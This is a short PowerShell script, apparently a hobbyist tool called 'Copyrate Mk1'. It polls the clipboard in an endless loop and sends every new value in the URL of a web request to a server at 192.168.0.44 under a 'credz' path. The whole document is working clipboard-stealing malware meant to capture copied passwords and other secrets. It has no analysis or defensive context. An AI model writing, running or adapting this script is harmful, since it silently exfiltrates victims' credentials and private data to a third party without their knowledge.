#Get clipboard content each time it s new and send it to remote server in URL 
Write-Host "Copyrate Mk1 by bus7d 2020"
*
$trace="W3!rd0"
while ("True")
{
$clip=Get-Clipboard -Raw
if ($trace -ne $clip){
$trace=$clip;
Invoke-WebRequest -URI http://192.168.0.44/credz/$clip;
$clip
}
}
